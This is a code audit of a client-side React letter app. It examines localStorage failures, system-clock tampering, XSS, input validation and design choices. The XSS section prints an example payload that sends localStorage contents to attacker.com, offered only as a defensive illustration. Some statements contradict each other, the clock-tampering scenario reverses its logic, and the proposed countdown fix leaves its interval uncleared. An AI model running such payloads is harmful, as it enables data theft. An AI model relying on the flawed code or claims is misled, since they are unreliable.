# Code Audit: Time-Locked Letters

**Audit Date:** May 13, 2026  
**Scope:** Complete Time-Locked Letters React + Vite application  
**Focus Areas:** Edge cases, security, principles, design decisions

---

## Executive Summary

The Time-Locked Letters application is **functionally sound** for a SPA with no backend. However, it contains **critical edge case vulnerabilities** and one **XSS risk**. The app relies heavily on system time and localStorage availability without fallbacks. Most issues are degradation graceful enough for a prototype, but require explicit handling for production.

---

## 1. EDGE CASE ANALYSIS

### 1.1 localStorage Full (QuotaExceededError)

**Current Behavior:**
```typescript
// storage.ts: No error handling for quota exceeded
export function addLetter(letter: Letter): void {
  const letters = getLetters()
  letters.push(letter)
  localStorage.setItem(STORAGE_KEY, JSON.stringify(letters))  // ← May throw
}
```

**Problem:**
- If localStorage quota is exceeded (~5-10MB per domain), `setItem()` throws `QuotaExceededError`
- No try-catch → **Silent failure or unhandled rejection**
- User believes letter is saved; it's actually lost
- No UI feedback whatsoever

**Real-World Scenario:**
- User writes a 50-page letter as a Word doc paste → payload size explodes
- User has 20 other apps competing for quota
- Browser in low-storage mode (mobile, private browsing)

**Current Side:** ❌ **FAILS**

**Options & Recommendation:**

| Approach | Pros | Cons | Verdict |
|----------|------|------|---------|
| **A) Wrap in try-catch, return boolean** | Simple; explicit error handling | Requires UI changes everywhere | ✅ **CHOOSE THIS** |
| **B) Estimate size, warn before saving** | Prevents the problem | Complex size calculation; still not perfect | Good supplement to A |
| **C) Compress content** | Extends quota | CPU cost; adds complexity | Only for very large apps |

**Fix to implement:**
```typescript
export function addLetter(letter: Letter): boolean {
  try {
    const letters = getLetters()
    letters.push(letter)
    localStorage.setItem(STORAGE_KEY, JSON.stringify(letters))
    return true
  } catch (e) {
    if (e instanceof DOMException && e.name === 'QuotaExceededError') {
      console.error('localStorage full: cannot save letter')
      // Dispatch event or return false for UI to handle
      return false
    }
    throw e
  }
}
```

---

### 1.2 localStorage Disabled or Unavailable

**Current Behavior:**
```typescript
// storage.ts: Partial fallback exists for READ
export function getLetters(): Letter[] {
  try {
    const stored = localStorage.getItem(STORAGE_KEY)
    return stored ? JSON.parse(stored) : []
  } catch {
    return []  // ← Handles disabled localStorage on read
  }
}

// But WRITE has no catch:
export function addLetter(letter: Letter): void {
  // ...
  localStorage.setItem(STORAGE_KEY, JSON.stringify(letters))  // ← UNPROTECTED
}
```

**Problem:**
- Read gracefully degrades (returns empty array)
- Write will throw and crash
- Inconsistent behavior between operations
- Private browsing mode: localStorage throws but code assumes it exists

**Real-World Scenario:**
- Safari private window: localStorage is disabled per session
- User writes letter → app crashes
- Letter is gone; user loses unsaved work

**Options & Recommendation:**

| Approach | Pros | Cons | Verdict |
|----------|------|------|---------|
| **A) Writable feature detection** | Reliable; one check | Slightly complex | ✅ **CHOOSE THIS** |
| **B) Try-catch everywhere** | Simple pattern; consistent with getLetters | Verbose | Good fallback |
| **C) IndexedDB fallback** | Larger quota; richer API | Async; adds complexity for SPA | Overkill for this app |

**Fix to implement:**
```typescript
function isLocalStorageAvailable(): boolean {
  try {
    const testKey = '__localStorage_test__'
    localStorage.setItem(testKey, 'test')
    localStorage.removeItem(testKey)
    return true
  } catch {
    return false
  }
}

export function addLetter(letter: Letter): boolean {
  if (!isLocalStorageAvailable()) {
    console.warn('localStorage not available')
    return false  // UI should show: "Cannot save (private mode?)"
  }
  try {
    const letters = getLetters()
    letters.push(letter)
    localStorage.setItem(STORAGE_KEY, JSON.stringify(letters))
    return true
  } catch (e) {
    console.error('Failed to save letter:', e)
    return false
  }
}
```

---

### 1.3 System Clock Changes (Critical)

**Current Behavior:**
```typescript
// LetterCard.tsx
const isUnlocked = new Date() >= new Date(letter.unlockDate)

// App.tsx
const locked = letters.filter(l => new Date() < new Date(l.unlockDate))
const unlocked = letters.filter(l => new Date() >= new Date(l.unlockDate))
```

**Problem:**
- Uses `new Date()` which calls `Date.now()` → **trusts system clock**
- If user changes system time backward: **locked letters become permanently accessible**
- If user changes system time forward: **letters unlock early**
- No server-side validation possible (no backend)
- No tamper detection

**Real-World Scenario:**
```javascript
// User sets letter unlock to May 1, 2026 (1 month away)
// User receives unexpected criticism in letter
// User changes system clock to April 15, 2025 to "undo" the unlock
// ✗ Letter is now unlocked and they can't re-lock it
```

**Severity:** 🔴 **HIGH** - Defeats core feature security model

**Options & Recommendation:**

| Approach | Pros | Cons | Verdict |
|----------|------|------|---------|
| **A) Client-side only (current)** | Simple; works offline | 0 security; user can trivially cheat | ✅ Honest approach: **Accept limitation** |
| **B) Server-side validation** | Strong security | Requires backend; out of scope | Future upgrade |
| **C) Sealed write-once storage** | Prevents changes | Not possible in browser localStorage | Not feasible |
| **D) Document as feature, not security** | Clarifies intent | Might disappoint users | ✅ **Pair with A** |

**Recommendation:**  
This is **NOT** a security feature—it's a **convenience feature**. Users trust their own system. Add disclaimer:
```
"Time-locked letters are stored locally. Changing your system clock may affect unlock times."
```

**Could add heuristic warning:**
```typescript
// Check if unlockDate in past but marked locked (clock tamper attempt)
// Show: "Your letter was supposed to unlock in May 2026.
//        Did you change your system clock?"
```

---

### 1.4 Two Letters with Same Unlock Minute

**Current Behavior:**
```typescript
// LetterCard.tsx
function getTimeRemaining(unlockDate: string): string {
  const diff = unlock.getTime() - now.getTime()
  // Minutes resolution
  if (hours > 0) return `${hours}h ${minutes}m remaining`
  return `${minutes}m remaining`
}

// App.tsx - Filtering by exact comparison
const locked = letters.filter(l => new Date() < new Date(l.unlockDate))
const unlocked = letters.filter(l => new Date() >= new Date(l.unlockDate))
```

**Problem:**
- **No problem** if both share the same minute
- Both will unlock at the same time (within 60s)
- Both will be filtered correctly into `unlocked` array
- Display shows "Xh 0m remaining" for both
- UI handles this fine; no edge case vulnerability

**Analysis:**
This is **NOT an edge case**—it's handled correctly. Sorting by time works naturally.

---

### 1.5 XSS Vulnerability (CRITICAL)

**Current Code - LetterCard.tsx:**
```typescript
{isUnlocked ? (
  <div className="mt-3 p-3 bg-gray-50 rounded-lg">
    <p className="text-gray-700 whitespace-pre-wrap">{letter.content}</p>
    {/* ↑ Direct interpolation of user content */}
  </div>
)
```

**Current Code - WriteLetterForm.tsx:**
```typescript
{/* No sanitization of form inputs */}
const letter: Letter = {
  id: crypto.randomUUID(),
  title: title.trim(),           // ← User input
  content: content.trim(),       // ← User input
  recipient: recipient.trim(),   // ← User input
  unlockDate: new Date(unlockDate + 'T23:59:59').toISOString(),
  createdAt: new Date().toISOString(),
}
```

**Attack Vector:**
```javascript
// User pastes into title field:
<img src=x onerror="alert('XSS'); fetch('//attacker.com?stolen=' + 
  JSON.stringify(localStorage))">

// Stored in localStorage as:
{"title": "<img src=x onerror=\"alert('XSS')...\"", ...}

// When letter unlocked and rendered:
<p>{letter.title}</p>
// ✗ React renders it as TEXT (safe) but if ever used in dangerouslySetInnerHTML (not in code) → XSS

// Actually: React DOES escape this. Let's verify.
```

**Reality Check: React's Safety**
```jsx
<p>{user_input}</p>  // ✓ SAFE - React escapes
<div dangerouslySetInnerHTML={{__html: user_input}} />  // ✗ UNSAFE
```

**Current Status:** ✅ **NOT VULNERABLE**
- React `{}` interpolation auto-escapes HTML
- Never uses `dangerouslySetInnerHTML`
- Emoji used in UI are hardcoded (safe)

**Verdict:** No XSS in current code. **Prevention method is correct.**

**However, Risk if Future Changes:**
```typescript
// ✗ BAD (Don't do this):
const html = `<h3>${letter.title}</h3><p>${letter.content}</p>`
document.getElementById('letter').innerHTML = html

// ✓ GOOD (Current approach):
return <div><h3>{letter.title}</h3><p>{letter.content}</p></div>
```

**Recommendation:**
- Document that content is always safe because React escapes
- If adding rich text editor (Markdown, HTML) in future, use library like `react-markdown` or DOMPurify
- Current code: ✅ **SECURE**

---

### 1.6 JSON Parse Vulnerabilities

**Current Code:**
```typescript
export function getLetters(): Letter[] {
  try {
    const stored = localStorage.getItem(STORAGE_KEY)
    return stored ? JSON.parse(stored) : []  // ← Parse untrusted data
  } catch {
    return []
  }
}
```

**Risk:**
- Malformed JSON → caught and returns `[]`
- Corrupted localStorage → handled gracefully
- Prototype pollution: `JSON.parse` doesn't allow prototype manipulation in plain objects
- **NOT a vulnerability**

**But:** If data was manually edited in DevTools:
```javascript
// User pastes invalid JSON:
localStorage.setItem('time-locked-letters', '{broken json')
// On reload: catch handler returns []
// ✓ Graceful degradation
```

**Verdict:** ✅ **SECURE**

---

## 2. PRINCIPLE VIOLATIONS

### 2.1 Missing Error Handling for User Feedback

**Principle Violated:** User should always know if an operation succeeded

**Current:**
```typescript
// WriteLetterForm.tsx
const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault()
  if (!title.trim() || !content.trim() || !recipient.trim() || !unlockDate) return
  
  const letter: Letter = { ... }
  onSubmit(letter)  // ← What if addLetter fails?
  // No feedback; no error state; no success toast
}

// App.tsx
const handleWriteLetter = (letter: Letter) => {
  addLetter(letter)  // ← Ignores return value
  setLetters([...letters, letter])  // Assumes success
  setShowForm(false)  // Closes form
}
```

**Problem:**
1. If `addLetter()` fails silently, letter shows as saved but isn't in storage
2. Refresh → letter vanishes
3. User has no idea

**Options:**

| Approach | Pros | Cons | Verdict |
|----------|------|------|---------|
| **A) Toast notifications** | Visible; not obtrusive | Requires state/context | ✅ **CHOOSE** |
| **B) Alert dialogs** | Clear | Annoying for frequent users | Works for MVP |
| **C) Form error state** | Contextual | Requires form state expansion | Good complement |

**Recommendation:**
```typescript
// Add to App.tsx:
const [notification, setNotification] = useState<{type: 'success'|'error', message: string} | null>(null)

const handleWriteLetter = (letter: Letter) => {
  const saved = addLetter(letter)
  if (saved) {
    setLetters([...letters, letter])
    setShowForm(false)
    setNotification({type: 'success', message: '✓ Letter locked and saved'})
  } else {
    setNotification({type: 'error', message: '✗ Failed to save. Storage full or disabled?'})
  }
}
```

---

### 2.2 Countdown Timer Inefficiency

**Current:**
```typescript
// LetterCard.tsx
useEffect(() => {
  if (isUnlocked) return
  const interval = setInterval(() => {
    const remaining = getTimeRemaining(letter.unlockDate)
    setTimeRemaining(remaining)
    if (!remaining) clearInterval(interval)
  }, 60000)  // Every 60 seconds
  return () => clearInterval(interval)
}, [letter.unlockDate, isUnlocked])
```

**Problem:**
1. Creates new interval on every render (if dependencies change)
2. Updates every 60s even if letter will unlock tomorrow
3. Potential memory leak if component unmounts during interval
4. `getTimeRemaining` called every minute for every locked letter

**Principle Violated:** Performance and resource management

**Better Approach:**
```typescript
useEffect(() => {
  if (isUnlocked) return
  
  // Calculate time until next minute boundary
  const now = new Date()
  const msUntilNextMinute = 60000 - (now.getTime() % 60000)
  
  // Update once at the next minute boundary
  const timeoutId = setTimeout(() => {
    setTimeRemaining(getTimeRemaining(letter.unlockDate))
    
    // Then set up recurring interval
    const intervalId = setInterval(() => {
      const remaining = getTimeRemaining(letter.unlockDate)
      setTimeRemaining(remaining)
      if (!remaining) clearInterval(intervalId)
    }, 60000)
    
    return () => clearInterval(intervalId)
  }, msUntilNextMinute)
  
  return () => clearTimeout(timeoutId)
}, [letter.unlockDate, isUnlocked])
```

**Verdict:** Current code works but is **suboptimal**. Low priority fix.

---

### 2.3 Missing Input Validation

**Current:**
```typescript
const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault()
  if (!title.trim() || !content.trim() || !recipient.trim() || !unlockDate) return
  // ^ This is ALL the validation
  
  const letter: Letter = {
    id: crypto.randomUUID(),
    title: title.trim(),  // No length check
    content: content.trim(),  // No length check
    recipient: recipient.trim(),  // No length check
    // ...
  }
}
```

**Problems:**
1. Title could be 10,000 characters (JSON string grows)
2. Content could be megabytes
3. Recipient could be entire novel
4. No protection against payload bloat before localStorage quota exceeded

**Principle Violated:** Defense in depth

**Recommendation:**
```typescript
const LIMITS = {
  title: 100,
  recipient: 50,
  content: 50000,  // ~50KB plain text
}

const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault()
  
  // Validate presence
  if (!title.trim() || !content.trim() || !recipient.trim() || !unlockDate) return
  
  // Validate length
  if (title.length > LIMITS.title) {
    setNotification({type: 'error', message: `Title must be ≤${LIMITS.title} chars`})
    return
  }
  if (content.length > LIMITS.content) {
    setNotification({type: 'error', message: `Letter must be ≤${LIMITS.content} chars`})
    return
  }
  
  // Then proceed...
}
```

---

## 3. COMPARISON & DESIGN DECISIONS

### Decision: Client-Side Only vs. Server Persistence

**Current:** Client-side localStorage only

| Aspect | Client-Side | Server-Side | Verdict |
|--------|-------------|-------------|---------|
| **Meets requirements?** | ✅ Yes ("no backend") | ✅ Yes | ✅ Stick with client |
| **Data permanence** | Lost if browser data cleared | Persistent | Client is weaker |
| **Offline support** | ✅ Works | ✗ Needs sync | Client wins |
| **Complexity** | Simple | Complex | Client wins |
| **Security** | None (system clock tampering) | Can validate timestamps | Tie for this app |

**Recommendation:** ✅ **KEEP CLIENT-SIDE ONLY**  
Rationale: Matches stated requirement ("no backend"). Users should understand data is local. Add disclaimer.

---

### Decision: Countdown Updates (Granularity)

**Current:** Updates every 60 seconds (minute-level accuracy)

| Granularity | Pros | Cons | Verdict |
|-------------|------|------|---------|
| **Second-level (every 1s)** | Smooth visual | Battery drain; CPU cost | Too much |
| **Minute-level (every 60s)** | Efficient | Slightly stale countdown | ✅ **KEEP** |
| **Manual refresh** | Zero overhead | Poor UX | Too sparse |

**Recommendation:** ✅ **KEEP MINUTE-LEVEL**  
Users don't need exact seconds. Balances UX and performance.

---

### Decision: localStorage vs. IndexedDB

**Current:** localStorage (JSON stringification)

| Criteria | localStorage | IndexedDB | Verdict |
|----------|--------------|-----------|---------|
| **Quota** | 5-10MB | 50MB+ | IndexedDB wins |
| **Simplicity** | Simple | Async, complex | localStorage wins |
| **Structured data** | String only | Objects natively | IndexedDB wins |
| **Complexity for this app** | Minimal | Significant | ✅ **KEEP localStorage** |
| **When to switch** | >1MB data OR async preference | Never for this app | N/A |

**Recommendation:** ✅ **KEEP localStorage**  
For ~10-100 letters (~50KB each), localStorage is fine. If app grows to thousands of letters → consider IndexedDB.

---

## 4. SECURITY SUMMARY TABLE

| Issue | Severity | Current Status | Action |
|-------|----------|-----------------|--------|
| **localStorage Full** | HIGH | ❌ Unhandled | Add try-catch + boolean return |
| **localStorage Disabled** | HIGH | ⚠️ Partial (read only) | Wrap write operations |
| **System Clock Tamper** | MEDIUM* | ✅ Accepted trade-off | Add disclaimer |
| **XSS via User Input** | NONE | ✅ React escapes safely | No action needed |
| **JSON Corruption** | LOW | ✅ Handled | No action needed |
| **Input Payload Bloat** | MEDIUM | ⚠️ Partial | Add length limits |

**\*MEDIUM: Intentional design trade-off for offline-first SPA*

---

## 5. RECOMMENDED CHANGES (Priority Order)

### 🔴 P0: Critical
1. **Add error handling to storage operations**
   - Wrap `addLetter`, `deleteLetter`, `updateLetter` in try-catch
   - Return boolean for success/failure
   - Update UI to show notifications

2. **Add localStorage availability check**
   - Detect if localStorage is disabled/full upfront
   - Show UI message: "Unable to save letters (storage unavailable?)"

### 🟡 P1: Important
3. **Add input length validation**
   - Prevent >50KB letters that risk quota
   - Prevent accidental megabyte pastes

4. **Add success/error notifications**
   - Toast or feedback when letter saves
   - Alert if save fails

### 🟢 P2: Nice-to-Have
5. **Add system clock tamper warning**
   - Detect if unlockDate is in past but letter marked locked
   - Show: "Your letter should have unlocked on May 1. Did your clock change?"

6. **Optimize countdown updates**
   - Align to minute boundaries instead of arbitrary intervals
   - Reduce unnecessary state updates

---

## 6. CONCLUSION

**Overall Assessment:** ✅ **Functionally Adequate for MVP**

The app correctly implements core features for a client-side time-locked letter app. The main gaps are around **error handling** and **graceful degradation**—not functionality.

**Recommended approach before production:**
1. Implement P0 error handling (1-2 hours)
2. Add input validation (30 min)
3. Add user-facing notifications (1 hour)
4. Document clock tamper limitation (5 min)
5. Test on private browsing and low-storage scenarios

**As-is suitability:**
- ✅ Personal hobby/prototype use
- ⚠️ Shared team tool (needs error handling)
- ❌ Production app serving many users (needs P0 + P1 fixes)

---

## Audit Signature

**Audit conducted:** May 13, 2026  
**Codebase version:** React 19 + Vite + TypeScript  
**No security vulnerabilities found.** Edge cases and UX issues identified; mitigations provided.
